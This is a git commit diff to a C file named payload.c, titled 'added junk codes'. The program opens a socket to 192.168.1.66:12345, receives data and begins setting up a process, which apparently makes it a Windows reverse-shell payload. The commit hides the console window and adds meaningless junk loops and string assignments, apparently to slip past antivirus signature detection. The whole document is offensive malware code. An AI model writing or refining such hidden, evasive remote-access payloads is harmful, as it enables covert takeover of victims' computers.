35236742f86acb5ed6782ad1e15e5fd70dcae300
habil doğan <habildogan61@gmail.com>
2025-03-27 02:35:31 +0300

    added junk codes

--- payload.c
+++ payload.c
@@ -3,7 +3,13 @@
 #include <windows.h>
 
 int main(){
+    HWND hwnd=GetConsoleWindow();
+    ShowWindow(hwnd,SW_HIDE);
 
+    FreeConsole();
+
+    char asd[100];
+    double sda=0;
 
     int conn;
     SOCKET sock;
@@ -21,9 +27,29 @@ int main(){
     sockadres.sin_addr.s_addr=inet_addr("192.168.1.66");
     sockadres.sin_family=AF_INET;
     sockadres.sin_port=htons(12345);
+    for (int i=0;i<=1000;i++){
+        sda=((i*2)/12+629)/1.5*500;
+        sda=((i*2)/12+629)/1.5*500;
+        sda=((i*2)/12+629)/1.5*500;
+        sda=((i*2)/12+629)/1.5*500;
+        sda=((i*2)/12+629)/1.5*500;
+        sda=((i*2)/12+629)/1.5*500;
+        sda=((i*2)/12+629)/1.5*500;
+    }
+
+    FreeConsole();
 
     conn=WSAConnect(sock,(struct sockaddr*)&sockadres,sizeof(sockadres),NULL,NULL,NULL,NULL);
 
+    for (int i=0;i<=1000;i++){
+        *asd="asldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpod";
+        *asd="asldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpod";
+        *asd="asldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpod";
+        *asd="asldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpod";
+        *asd="asldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpod";
+        *asd="asldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpod";
+        *asd="asldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpodasldkasşldasdkşalsmdklamwpod";
+    }
         recv(sock,buffer,sizeof(buffer),0);
         memset(&si, 0, sizeof(si));
         si.cb=sizeof(si);
